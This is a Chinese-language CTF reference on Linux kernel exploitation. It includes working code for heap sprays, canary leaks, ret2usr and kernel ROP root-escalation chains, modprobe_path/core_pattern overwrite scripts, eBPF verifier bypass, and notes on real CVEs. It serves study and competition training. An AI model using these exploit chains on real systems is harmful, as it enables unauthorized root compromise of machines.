# CTF Pwn - Linux 内核利用

## 目录
- [环境搭建与信息收集](#环境搭建与信息收集)
  - [QEMU 调试环境](#qemu-调试环境)
  - [提取 vmlinux](#提取-vmlinux)
  - [内核配置检查](#内核配置检查)
  - [FGKASLR 检测](#fgkaslr-检测)
- [堆喷常用的内核结构体](#堆喷常用的内核结构体)
  - [tty_struct（kmalloc-1024）](#tty_structkmalloc-1024)
  - [tty_file_private（kmalloc-32）](#tty_file_privatekmalloc-32)
  - [poll_list（kmalloc-32 到 1024）](#poll_listkmalloc-32-到-1024)
  - [user_key_payload（kmalloc-32 到 1024）](#user_key_payloadkmalloc-32-到-1024)
  - [setxattr 临时缓冲区（kmalloc-32 到 1024）](#setxattr-临时缓冲区kmalloc-32-到-1024)
  - [seq_operations（kmalloc-32）](#seq_operationskmalloc-32)
  - [subprocess_info（kmalloc-128）](#subprocess_infokmalloc-128)
- [内核栈溢出与 canary 泄漏](#内核栈溢出与-canary-泄漏)
- [提权原语](#提权原语)
  - [ret2usr（无 SMEP/SMAP）](#ret2usr无-smepsmap)
  - [使用 prepare_kernel_cred / commit_creds 的内核 ROP](#使用-prepare_kernel_cred--commit_creds-的内核-rop)
  - [保存与恢复用户态状态](#保存与恢复用户态状态)
- [modprobe_path 覆写](#modprobe_path-覆写)
  - [技巧概述](#技巧概述)
  - [无泄漏时暴力枚举](#无泄漏时暴力枚举)
  - [检查 CONFIG_STATIC_USERMODEHELPER](#检查-config_static_usermodehelper)
- [core_pattern 覆写](#core_pattern-覆写)
- [kmalloc 尺寸不匹配导致的内核堆溢出（PlaidCTF 2013）](#kmalloc-尺寸不匹配导致的内核堆溢出plaidctf-2013)
- [eBPF 校验器绕过利用（UIUCTF 2021、D^3CTF 2022）](#ebpf-校验器绕过利用uiuctf-2021d3ctf-2022)
- [通过 I/O 端口 hypercall 打通用户-内核-hypervisor 三层链（HITCON 2018）](#通过-io-端口-hypercall-打通用户-内核-hypervisor-三层链hitcon-2018)
- [ACPI DSDT Shellcode 注入提权（hxp 2018）](#acpi-dsdt-shellcode-注入提权hxp-2018)
- [ARM fcntl64 set_fs() CVE-2015-8966 管道外泄（Insomnihack 2019）](#arm-fcntl64-set_fs-cve-2015-8966-管道外泄insomnihack-2019)
- [io_uring PBUF_RING 释放后使用 — CVE-2024-0582（KernelCTF 2024）](#io_uring-pbuf_ring-释放后使用--cve-2024-0582kernelctf-2024)

关于 tty_struct kROP（内核 ROP）、userfaultfd 竞态稳定化、SLUB 内部机制、跨缓存攻击以及 DiceCTF 2026 内核模式，见 [kernel-techniques.md](kernel-techniques.md)。

关于保护绕过技术（KASLR、FGKASLR、KPTI、SMEP、SMAP）、GDB 调试、initramfs 工作流与利用模板，见 [kernel-bypass.md](kernel-bypass.md)。

---

<a id="environment-setup-and-recon"></a>
## 环境搭建与信息收集

**关键点：** 编写任何利用之前，先检查 QEMU 启动脚本中启用了哪些缓解措施（`smep`、`smap`、`kpti`、`kaslr`）以及 `oops=panic` 标志。它们决定了哪些利用技术可行。初始调试时应关闭全部缓解，然后逐一重新启用。

<a id="qemu-debug-environment"></a>
### QEMU 调试环境

内核题调试用的标准 QEMU 启动脚本：

```bash
qemu-system-x86_64 \
  -kernel ./bzImage \
  -initrd ./rootfs.cpio \
  -nographic \
  -monitor none \
  -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=1" \
  -no-reboot \
  -s \
  -m 256M
```

- `-s` 在 1234 端口开启 GDB（`target remote :1234`）
- `-append "nokaslr"` 为调试关闭 KASLR
- 检查 QEMU 脚本中的：`smep`、`smap`、`kaslr`、`oops=panic`、`kpti=1`
- 若没有 `oops=panic`，内核 oops 只会杀掉出错进程（可通过 dmesg 做信息泄漏）

**初始调试时关闭缓解**，修改启动脚本：
```bash
-append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
-cpu kvm64   # instead of kvm64,+smep,+smap
```

<a id="extracting-vmlinux"></a>
### 提取 vmlinux

**从 bzImage 提取 vmlinux：**
```bash
# Use extract-vmlinux.sh from Linux kernel source (scripts/extract-vmlinux)
./extract-vmlinux ./bzImage > vmlinux

# Extract ROP gadgets
ROPgadget --binary ./vmlinux > gadgets.txt
```

<a id="kernel-config-checks"></a>
### 内核配置检查

| 配置 | 作用 | 检查方法 |
|--------|--------|-------------|
| SMEP/SMAP/KASLR/KPTI | CPU 级缓解 | 检查 QEMU 启动脚本的 `-cpu` 与 `-append` 参数 |
| FGKASLR | 逐函数随机化 | `readelf -S vmlinux` 的段数量（见下） |
| `SLAB_FREELIST_RANDOM` | 空闲链表顺序随机化 | 连续分配的对象不再相邻 |
| `SLAB_FREELIST_HARDEN` | 空闲指针 XOR 混淆 | 在 GDB 中检查空闲链表指针 |
| `STATIC_USERMODEHELPER` | 阻止覆写 `modprobe_path` | 反汇编 `call_usermodehelper_setup` |
| `KALLSYMS_ALL` | `/proc/kallsyms` 中的 `.data` 符号 | `grep modprobe_path /proc/kallsyms` |
| `CONFIG_USERFAULTFD` | 启用 userfaultfd 系统调用 | 直接调用试试；禁用则返回 -ENOSYS |
| eBPF（扩展 Berkeley Packet Filter）JIT | JIT 编译 BPF 过滤器 | `cat /proc/sys/net/core/bpf_jit_enable`（0=关、1=开、2=调试） |

检查 oops 行为：
- QEMU `-append` 中有 `oops=panic` -> oops 会导致整个内核 panic
- 没有该标志 -> oops 只杀掉出错进程；dmesg 可能泄漏栈/堆/内核基址指针

<a id="fgkaslr-detection"></a>
### FGKASLR 检测

细粒度 KASLR 独立随机化每个函数。通过统计 ELF 段数量来检测：

```bash
readelf -S vmlinux | tail -5
# FGKASLR disabled: ~30 sections
# FGKASLR enabled:  36000+ sections (one per function)

file vmlinux
# FGKASLR enabled: "too many section (36140)"
```

---

<a id="useful-kernel-structures-for-heap-spray"></a>
## 堆喷常用的内核结构体

这些结构体从标准 `kmalloc` 缓存分配，且可由用户态控制。用它们填充被释放的槽位以实现 UAF 利用，或用于泄漏内核指针。

**关键点：** 按照漏洞对象的 `kmalloc` 缓存大小选择堆喷结构体。kmalloc-32 用 `seq_operations` 或 `tty_file_private`；kmalloc-1024 用 `tty_struct`；可变尺寸（32-1024）用 `poll_list`、`user_key_payload` 或 `setxattr`。

| 结构体 | 缓存 | 分配触发 | 释放触发 | 用途 |
|-----------|-------|---------------|--------------|-----|
| `tty_struct` | kmalloc-1024 | `open("/dev/ptmx")` | `close(fd)` | kbase 泄漏、RIP 劫持 |
| `tty_file_private` | kmalloc-32 | `open("/dev/ptmx")` | `close(fd)` | kheap 泄漏（指向 `tty_struct`） |
| `poll_list` | kmalloc-32~1024 | `poll(fds, nfds, timeout)` | `poll()` 返回 | kheap 泄漏、任意释放 |
| `user_key_payload` | kmalloc-32~1024 | `add_key()` | `keyctl_revoke()`+GC | 任意值写入 |
| `setxattr` buffer | kmalloc-32~1024 | `setxattr()` | 同一调用路径 | 瞬时任意值写入 |
| `seq_operations` | kmalloc-32 | `open("/proc/self/stat")` | `close(fd)` | kbase 泄漏、RIP 劫持 |
| `subprocess_info` | kmalloc-128 | 内核内部 | 内核内部 | kbase 泄漏、RIP 劫持 |

<a id="tty_struct-kmalloc-1024"></a>
### tty_struct（kmalloc-1024）

`open("/dev/ptmx")` 时分配，`close()` 时释放。大小：0x2B8 字节。

```c
struct tty_struct {
    int magic;                    // +0x00: must be 0x5401 (paranoia check)
    struct kref kref;             // +0x04: reference count
    struct device *dev;           // +0x08
    struct tty_driver *driver;    // +0x10: must be valid kheap pointer
    const struct tty_operations *ops; // +0x18: vtable pointer -> kbase leak
    // ...
};
```

- **kbase 泄漏：** 读 `tty_struct.ops`——指向内核 `.data` 中的 `ptm_unix98_ops`（或类似）
- **RIP 劫持：** 把 `tty_struct.ops` 覆写为指向假 vtable 的指针，随后 `ioctl()` 会调用 `tty->ops->ioctl()`
- **magic** 必须保持 `0x5401`，否则 `tty_ioctl()` 立即返回（paranoia 检查）
- **driver** 必须是合法的内核堆指针，否则内核 oops

<a id="tty_file_private-kmalloc-32"></a>
### tty_file_private（kmalloc-32）

在 `tty_alloc_file()` 中与 `tty_struct` 一同分配。大小：0x20 字节。

```c
struct tty_file_private {
    struct tty_struct *tty;   // +0x00: pointer to tty_struct in kmalloc-1024
    struct file *file;        // +0x08
    struct list_head list;    // +0x10
};
```

- **kheap 泄漏：** 读 `tty_file_private.tty` 得到 `kmalloc-1024` 中的地址

<a id="poll_list-kmalloc-32-to-1024"></a>
### poll_list（kmalloc-32 到 1024）

`poll()` 期间分配，`poll()` 结束（超时或事件触发）时释放。缓存大小取决于轮询的 fd 数量。

```c
struct poll_list {
    struct poll_list *next;   // +0x00: linked list pointer
    int len;                  // +0x08: number of entries
    struct pollfd entries[];  // +0x0C: variable-length array
};
```

- **任意释放：** 覆写 `poll_list.next` -> `poll()` 结束时它会释放链表中所有条目（含被污染的指针）-> 对任意地址的 UAF

<a id="user_key_payload-kmalloc-32-to-1024"></a>
### user_key_payload（kmalloc-32 到 1024）

通过 `add_key()` 系统调用分配。缓存大小取决于 `data` 长度。

```c
struct user_key_payload {
    struct callback_head rcu;     // +0x00: 16 bytes, untouched until init
    unsigned short datalen;       // +0x10
    char data[];                  // +0x18: user-controlled content
};
```

- 前 16 字节在 GC 回调之前未初始化——配合 UAF 可泄漏堆残留数据
- 释放需要先 `keyctl_revoke()` 再等 GC
- 默认 Docker seccomp 配置会拦截

<a id="setxattr-temporary-buffer-kmalloc-32-to-1024"></a>
### setxattr 临时缓冲区（kmalloc-32 到 1024）

`setxattr("file", "user.x", data, size, XATTR_CREATE)` 会分配缓冲区、拷贝用户数据，然后在同一调用路径中释放。

- **瞬时写入：** 配合未初始化结构体，把任意值写入被释放的 chunk
- 不能用于持久堆喷（立即释放）
- 传给 `setxattr()` 的文件必须存在——当利用在非预期目录执行时这是常见坑

<a id="seq_operations-kmalloc-32"></a>
### seq_operations（kmalloc-32）

打开 `/proc/self/stat`（或类似 seq_file）时分配。含函数指针，可用于 kbase 泄漏。

<a id="subprocess_info-kmalloc-128"></a>
### subprocess_info（kmalloc-128）

内核内部结构体，含函数指针。在特定场景下可用于 kbase 泄漏与 RIP 劫持。

---

<a id="kernel-stack-overflow-and-canary-leak"></a>
## 内核栈溢出与 canary 泄漏

带漏洞 read/write 处理函数的内核模块常允许栈缓冲区溢出。利用模式与用户态栈溢出类似，但需要处理内核特有的寄存器状态。

**通过超长 read 泄漏 canary（hxp CTF 2020）：**

有漏洞的 `hackme_read()` 从 32 元素栈数组 `tmp[32]` 拷贝，却允许读取最多 0x1000 字节——泄漏越过缓冲区的栈 canary 与内核代码指针。

```c
unsigned long leak[40];
int fd = open("/dev/hackme", O_RDWR);

// Read beyond stack buffer to leak canary + kernel pointers
read(fd, leak, sizeof(leak));

// Stack layout: tmp[32] at rbp-0x98, canary at rbp-0x18
// Canary at index 16 (offset 0x80 from buffer start)
unsigned long cookie = leak[16];

// Kernel text pointer at index 38 -> compute KASLR base
unsigned long kernel_base = (leak[38] & 0xffffffffffff0000);
long kaslr_offset = kernel_base - 0xffffffff81000000;
```

**栈溢出载荷结构：**

```c
unsigned long payload[50];
int off = 16;                    // offset to canary position
payload[off++] = cookie;         // canary
payload[off++] = 0x0;            // padding (rbx)
payload[off++] = 0x0;            // padding (r12)
payload[off++] = 0x0;            // saved rbp
payload[off++] = rop_start;      // return address -> ROP chain
// ... ROP chain follows ...
write(fd, payload, sizeof(payload));
```

**通过 ioctl 绕过长度检查（K3RN3LCTF 2021）：**

有些模块用全局 `MaxBuffer` 变量来限制写长度，而该变量本身可通过 `ioctl()` 控制：

```c
// Vulnerable pattern in module:
// swrite() checks: if (MaxBuffer < user_size) return -EFAULT;
// sioctl() with cmd 0x20: MaxBuffer = (int)arg;  <- attacker-controlled

// Exploit: increase MaxBuffer before overflow
int fd = open("/proc/pwn_device", O_RDWR);
ioctl(fd, 0x20, 300);            // set MaxBuffer to 300 (buffer is only 128)
write(fd, overflow_payload, 300); // now passes size check -> stack overflow
```

**关键点：** 内核栈 canary 与用户态 canary 工作机制相同。拷贝字节数超过缓冲区大小的 read 处理函数会泄漏 canary 与保存的寄存器，包括用于绕过 KASLR 的内核代码指针。留意那些修改全局变量用于边界检查的 `ioctl` 处理函数——它们往往能绕过写长度限制。

---

<a id="privilege-escalation-primitives"></a>
## 提权原语

<a id="ret2usr-no-smepsmap"></a>
### ret2usr（无 SMEP/SMAP）

SMEP 与 SMAP 关闭时，内核可以直接执行用户态代码并访问用户态内存。把 RIP 劫持到用户态函数，该函数调用 `prepare_kernel_cred(0)` 再调用 `commit_creds()`。

```c
// Addresses from /proc/kallsyms (or leak)
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds       = 0xffffffff814c6410;

// Saved userland state for iretq return
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"        // prepare_kernel_cred(NULL) -> init cred
        "call rax;"
        "mov rdi, rax;"        // commit_creds(new_cred)
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"              // restore GS base for userland
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"               // return to userland as root
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

`privesc()` 返回用户态后，进程拥有 root 凭据。调用 `system("/bin/sh")` 获取 root shell。

<a id="kernel-rop-with-prepare_kernel_cred--commit_creds"></a>
### 使用 prepare_kernel_cred / commit_creds 的内核 ROP

SMEP 启用时，构造内核 ROP 链调用 `prepare_kernel_cred(0)` -> 把结果传给 `commit_creds()` -> 返回用户态。

```c
// Find gadgets: ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax" ./vmlinux
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long mov_rdi_rax_pop1_ret = 0xffffffff816bf740; // mov rdi, rax; ...; pop rbx; ret
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;      // swapgs; pop rbp; ret
unsigned long iretq = 0xffffffff8100c0d9;

unsigned long payload[50];
int off = 16;   // canary offset
payload[off++] = cookie;
payload[off++] = 0;           // rbx
payload[off++] = 0;           // r12
payload[off++] = 0;           // rbp

// ROP chain: prepare_kernel_cred(0) -> commit_creds(result)
payload[off++] = pop_rdi_ret;
payload[off++] = 0x0;                      // rdi = NULL
payload[off++] = prepare_kernel_cred;
payload[off++] = mov_rdi_rax_pop1_ret;     // rdi = rax (new cred)
payload[off++] = 0x0;                      // pop rbx padding
payload[off++] = commit_creds;

// Return to userland
payload[off++] = swapgs_pop1_ret;
payload[off++] = 0x0;                      // pop rbp padding
payload[off++] = iretq;
payload[off++] = user_rip;                 // spawn_shell
payload[off++] = user_cs;                  // 0x33
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;                  // 0x2b
```

**关键 gadget：`mov rdi, rax`** —— 用于把 `prepare_kernel_cred()` 的返回值（在 RAX 中）传给 `commit_creds()`（参数在 RDI 中）。搜索 `mov rdi, rax; ... ; ret` 等可能破坏其他寄存器的变体。

**工具：** 处理大内核镜像时 `ropr` 比 ROPgadget 更快：
```bash
ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax|^swapgs|^iretq" ./vmlinux
```

<a id="saving-and-restoring-userland-state"></a>
### 保存与恢复用户态状态

触发内核利用之前，先保存用户态寄存器状态供 `iretq` 返回使用：

```c
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;  // function to call after return
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}
```

**寄存器取值（x86_64 用户态）：**
- `CS` = 0x33（64 位用户代码段）
- `SS` = 0x2b（64 位用户栈段）
- `RSP` = 当前用户态栈指针
- `RFLAGS` = 当前标志寄存器
- `RIP` = 后利用函数的地址（例如 `spawn_shell`）

---

<a id="modprobe_path-overwrite"></a>
## modprobe_path 覆写

<a id="technique-overview"></a>
### 技巧概述

把全局变量 `modprobe_path`（默认 `"/sbin/modprobe"`）覆写为指向攻击者控制的脚本。内核遇到未知格式的二进制文件时，会以 root 执行 `modprobe_path`。

**要求：**
1. 有任意地址写（AAW）能力覆写 `modprobe_path`
2. 能创建两个文件：一个畸形二进制和一个恶意脚本
3. `CONFIG_STATIC_USERMODEHELPER` 处于禁用状态

**步骤：**

```bash
# 1. Write evil script
echo '#!/bin/sh' > /tmp/evil.sh
echo 'cat /flag > /tmp/output' >> /tmp/evil.sh
echo 'chmod 777 /tmp/output' >> /tmp/evil.sh
chmod +x /tmp/evil.sh

# 2. Overwrite modprobe_path with "/tmp/evil.sh" using your AAW primitive

# 3. Create and execute a malformed binary (non-printable first 4 bytes)
echo -ne '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger

# 4. Read the flag
cat /tmp/output
```

**工作原理：** `execve()` -> `search_binary_handler()` -> 没有格式匹配 -> `request_module("binfmt-XXXX")` -> `call_modprobe()` -> 以 root 执行 `modprobe_path`。

**关键点：** 触发用二进制的头 4 个字节必须不可打印（不含 tab/换行之外的 ASCII）。如果可打印，内核会跳过 `request_module()` 调用。

<a id="bruteforce-without-leak"></a>
### 无泄漏时暴力枚举

在 KASLR 下 `modprobe_path` 只有 1 字节熵（被随机化的页偏移）。有 AAW 时暴力枚举地址：

```python
# modprobe_path base address (from debugging without KASLR)
MODPROBE_BASE = 0xffffffff8265ff00
# Under KASLR, only the 0x65 byte varies
# Try 256 offsets
for byte_guess in range(256):
    addr = (MODPROBE_BASE & ~0xFF0000) | (byte_guess << 16)
    write_string(addr, "/tmp/evil.sh")
    trigger_modprobe()
```

<a id="checking-config_static_usermodehelper"></a>
### 检查 CONFIG_STATIC_USERMODEHELPER

若启用，`call_usermodehelper_setup()` 会忽略 `modprobe_path` 并使用硬编码常量。

**通过反汇编检测：**

```bash
# 1. Get function address
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. Set GDB breakpoint and trigger
echo -ne '\xff\xff\xff\xff' > /tmp/nirugiri && chmod +x /tmp/nirugiri && /tmp/nirugiri

# 3. In GDB, disassemble and check:
# NOT set: rdi saved into r14 at +9, used at +127 -> modprobe_path passed through
# SET: immediate constant at +122 instead of r14 -> 1st arg (modprobe_path) ignored
```

**启用时：** `sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH`（常量）。覆写 `modprobe_path` 无效，需寻找其他 LPE 技巧。

---

<a id="core_pattern-overwrite"></a>
## core_pattern 覆写

`modprobe_path` 的替代方案。把 `/proc/sys/kernel/core_pattern`（或内部变量 `core_pattern`）覆写为管道命令。进程崩溃时，内核会以 root 执行该命令处理 core dump。

```bash
# core_pattern with pipe: first char '|' means execute as command
# Overwrite core_pattern to: "|/tmp/evil.sh"
# Then crash a process to trigger
```

**寻找偏移：** 未启用 `CONFIG_KALLSYMS_ALL` 时，`core_pattern` 不会通过 `/proc/kallsyms` 导出。寻找方法：

1. 在 `override_creds()`（由 `do_coredump()` 调用）上设断点
2. 让进程崩溃：`int main() { ((void(*)())0)(); }`
3. `override_creds` 返回后反汇编——寻找从数据地址加载的 `movzx`
4. 该地址即 `core_pattern`

**关键点：** 当 `CONFIG_STATIC_USERMODEHELPER` 阻止 modprobe 时，`core_pattern` 是 `modprobe_path` 的替代方案。把它覆写为 `|/tmp/evil.sh`，再让任意进程崩溃即可触发 root 命令执行。由于 `core_pattern` 不总是导出在 `/proc/kallsyms` 中，找地址需要在故意崩溃时对 `override_creds` 下 GDB 断点。

```text
(gdb) finish
(gdb) x/5i $rip
=> 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
(gdb) x/s 0xffffffff81eb0b20
0xffffffff81eb0b20: "core"
```

---

<a id="kernel-heap-overflow-via-kmalloc-size-mismatch-plaidctf-2013"></a>
## kmalloc 尺寸不匹配导致的内核堆溢出（PlaidCTF 2013）

**模式：** 内核模块分配 `kmalloc(content_length)`，却拷贝 `0x40 + content_length` 字节（头部 + 正文），造成 0x40 字节的堆溢出，覆盖到相邻 slab 对象。

```c
// Vulnerable pattern in kernel HTTP handler:
buf = kmalloc(content_length, GFP_KERNEL);
memcpy(buf, http_header, 0x40);           // 0x40 bytes of header
memcpy(buf + 0x40, body, content_length); // Overflow!
```

**利用：**
1. **slab 堆喷：** 打开 1021 个文件描述符（`open("/dev/kmalloc_target")`）填满 kmalloc-256 缓存
2. **制造空洞：** 关闭 3 个文件，在 slab 中为溢出的分配留出空隙
3. **触发溢出：** 发送正文溢出的 HTTP 请求，覆盖相邻的 `struct file`
4. **破坏 `f_op`：** 覆写相邻 `struct file` 中的 `f_op`（文件操作）指针以重定向函数指针
5. **劫持写处理函数：** `f_op->write` 现在指向攻击者控制的地址 -> `commit_creds(prepare_kernel_cred(0))`

**关键点：** `struct file` 位于 kmalloc-256，含 `f_op`（函数指针表）。把 `f_op` 破坏为假 vtable 即可控制任何文件操作（`read`、`write`、`ioctl`）。攻击者通过被污染的文件描述符触发被劫持的操作。

---

<a id="ebpf-verifier-bypass-exploitation-uiuctf-2021-d3ctf-2022"></a>
## eBPF 校验器绕过利用（UIUCTF 2021、D^3CTF 2022）

利用 eBPF 校验器的静态分析与运行时行为之间的不一致，实现任意内核读/写。

```c
// Pattern: Verifier tracks register states differently from hardware
// Example: Right-shift desynchronization (D^3CTF 2022)
// Verifier thinks: shr reg, 64 -> reg = 0
// Hardware does:   shr reg, 64 -> reg = original_value (shift >= width = undefined)

// Step 1: Create desynchronized register
BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 64),  // verifier: R7=0, runtime: R7=1

// Step 2: Use desync to bypass ALU sanitizer
BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, offset),  // verifier: 0*offset=0, runtime: 1*offset=offset

// Step 3: Add to map pointer for OOB access
BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  // verifier allows (adding 0)
// Runtime: map_ptr + offset -> arbitrary kernel memory access

// Step 4: Read/write kernel memory, overwrite modprobe_path or cred struct
```

```bash
# eBPF exploitation workflow:
# 1. Find verifier vs runtime mismatch (RSH, bounds tracking, helper params)
# 2. Create register with verifier_value != runtime_value
# 3. Use desync register to bypass pointer arithmetic checks
# 4. Achieve arbitrary read via map value OOB
# 5. Leak kernel base from adjacent slab objects
# 6. Arbitrary write to modprobe_path or current->cred

# Helper function overflow variant (d3bpf-v2):
# bpf_skb_load_bytes(skb, offset, stack_buf, len)
# Verifier checks len <= 512, but desync makes runtime len huge
# Stack buffer overflow -> ROP to commit_creds(init_cred)

# KASLR bypass via eBPF:
# Trigger controlled oops -> dmesg leaks kernel addresses
# Or: read adjacent slab objects containing kernel pointers
```

**关键点：** eBPF 校验器漏洞会在静态分析与运行时之间制造“类型混淆”。模式总是：(1) 找校验器预测与硬件行为不同的操作，(2) 放大差值以产生有用偏移，(3) 加到 map 指针上访问内核内存。查看内核更新日志中的 eBPF 校验器补丁——每个补丁都意味着此前存在可利用的 bug。

另见：[kernel-techniques.md](kernel-techniques.md) 中的其他内核利用技术。

---

<a id="user-kernel-hypervisor-chain-via-io-port-hypercalls-hitcon-2018"></a>
## 通过 I/O 端口 hypercall 打通用户-内核-hypervisor 三层链（HITCON 2018）

**模式：** 三层题目（user.elf → kernel.bin → hypervisor）通过 kernel.bin 中的白名单限制用户态直接发起 hypercall。攻击者：(1) 破坏 RPN 计算器用户态程序，向其 GOT 写入任意字节；(2) 用该写能力突破到内核态；(3) 在内核态通过 `out dx, eax` 访问 I/O 端口 `0x8000..0x80FF` 直接发起 hypercall，hypervisor 将其视为系统调用分发。最后的转折：hypervisor 只接受已经存在于内核内存中的字符串，因此先用一次故意失败的 `open()` 系统调用把目标路径写入内核缓冲区，再用该缓冲区地址重新发起 hypercall。

```asm
; Kernel-mode stub running inside kernel.bin after the pivot
mov dx, 0x8000 + 5          ; I/O port = base + syscall_number (here: open)
mov eax, <kernel_buffer>    ; pointer that lives in kernel memory
out dx, eax                 ; hypervisor reads from the port as an arg

mov dx, 0x8000 + 0          ; syscall 0 = read
mov eax, flag_buffer
out dx, eax
```

```python
# User-mode payload that pivots into kernel.bin via GOT overwrite
from pwn import *
io = remote("challenge.hitcon", 1337)

# 1. RPN-calc overwrites got['strtol'] with a kernel gadget that calls the
#    privileged hypercall stub.
payload = rpn_overwrite(target="strtol",
                        value=kernel_gadget_address)
io.sendline(payload)

# 2. Kernel stub runs the I/O-port sequence above and writes the flag back.
io.recvuntil(b"flag{")
log.success(b"flag{" + io.recvuntil(b"}"))
```

**关键点：** 题目堆叠的特权环越多，越要理清*数据必须位于哪里*与*代码必须在哪运行*。HITCON Abyss 对用户态 hypercall 实施了内核白名单，但内核代码本身仍能直接操作 hypervisor 端口。同样的模式在真实 VM 逃逸中反复出现：一个 guest 内核原语加上一次 I/O 端口写就能抵达 VMM，无需经过 guest 自己的系统调用表。攻击 `kvm_guest_enter` 这类 hypervisor 时，要寻找 VMM 会陷入的内存映射 I/O 区域或端口范围——它们其实是伪装的 hypercall，而且往往缺少正式 hypercall 接口所需的参数清洗。

**参考：** HITCON CTF 2018 — Abyss I & II，writeups 11918、11919、11933、11934、11937、11938

---

<a id="acpi-dsdt-shellcode-injection-for-privilege-escalation-hxp-2018"></a>
## ACPI DSDT Shellcode 注入提权（hxp 2018）

**模式：** “Green Computing”类题目启动带攻击者可控 ACPI 表的内核。把 shellcode 嵌入 DSDT 的 `OperationRegion(SystemMemory, ...)`，在启动时通过 `Field` 写把它写进内核内存。补丁目标如 `commit_creds`，使后续任何 setuid 调用都提升权限。

```asl
OperationRegion (PWDN, SystemMemory, 0x1241000, 0x400)
Field (PWDN, AnyAcc, NoLock, Preserve) { JMPA, 0x400 }
JMPA = Buffer () { 0x41, 0x55, 0x41, 0x54, 0x48, /* shellcode */ }

OperationRegion (NISC, SystemMemory, 0x104ac24, 96)
Field (NISC, AnyAcc, NoLock, Preserve) { NICD, 768 }
NICD = Buffer () { 0x48, 0xc7, 0xc0, /* patched commit_creds prologue */ }
```

**关键点：** ACPI AML 在常规内核保护生效之前就能直接访问物理内存。当题目允许你提供 DSDT/SSDT 字节时，`SystemMemory` 的 `OperationRegion` 就是比多数显式内核 bug 都强大的内核写原语。

**参考：** hxp CTF 2018 — Green Computing 1-2，writeups 12550+

---

<a id="arm-fcntl64-set_fs-cve-2015-8966-pipe-exfil-insomnihack-2019"></a>
## ARM fcntl64 set_fs() CVE-2015-8966 管道外泄（Insomnihack 2019）

**模式：** Bug：ARM Linux 上的 `fcntl64` 通过 `set_fs()` 设置 `KERNEL_DS` 却从不恢复。利用：fork 一个调用 `fcntl64` 的子进程，然后让子进程通过管道写任意内核地址；父进程从管道读回。直接读 MMU 区域会 panic，因此管道作为安全的中转层。

```c
if (fork() == 0) {
    trigger_fcntl64_bug();                // now at KERNEL_DS
    write(pipe_w, (void*)kernel_addr, N); // unchecked kernel read
    _exit(0);
}
read(pipe_r, leak, N);                    // parent gets kernel memory
```

泄漏 cred 结构体后，原地把 `uid/gid/euid/egid = 0` 改写，调用 `getuid()` 确认为 root。

**关键点：** 缺少 `set_fs(USER_DS)` 恢复是一行代码的 bug，却给出了对内核地址的无限制 copy_from/to_user。把危险读取包在管道里，内核拷贝循环就不会直接触碰被禁止的 MMU 区域。

**参考：** Insomnihack teaser 2019 — 1118daysober，writeup 12903

---

<a id="io_uring-pbuf_ring-use-after-free--cve-2024-0582-kernelctf-2024"></a>
## io_uring PBUF_RING 释放后使用 — CVE-2024-0582（KernelCTF 2024）

**漏洞：** `io_uring` 的缓冲区环注册（`IORING_REGISTER_PBUF_RING` / `IORING_UNREGISTER_PBUF_RING`）对 `io_buffer_list` / `io_buffer` 对象的生命周期处理有误。注销会释放环，但在途的 `PROVIDE_BUFFERS` 请求仍持有引用，导致 UAF。2024 年 2 月修补（`io_uring: fix UAF on pbuf ring`）。

**关键区别——PBUF_RING（内核注册）与用户态 SQE：**

| 方面 | PBUF_RING（`IORING_REGISTER_PBUF_RING`） | 用户态 SQE（`IORING_OP_PROVIDE_BUFFERS`） |
|--------|------------------------------------------|---------------------------------------------|
| 后备存储 | 内核分配的 `io_buffer_list`，经 `io_uring_register()` 注册；内核跟踪引用计数 | 用户态映射的 SQ 环；条目是经 `copy_from_user()` 拷贝的裸 `struct io_uring_sqe` |
| 生命周期 | 由 `io_buffer_list.ref` 管理——必须存活到所有 `provide_buffers` 完成 | 短暂——SQE 在 `io_submit_sqe()` 中同步消费 |
| Bug 面 | `io_unregister_pbuf_ring()` 丢弃 `bl->ref` 并 `kfree(bl)`，却不等待仍解引用 `bl->buf_ring` 的待处理 `IORING_OP_PROVIDE_BUFFERS` | 不受影响——SQE 是栈拷贝，没有持久指针 |
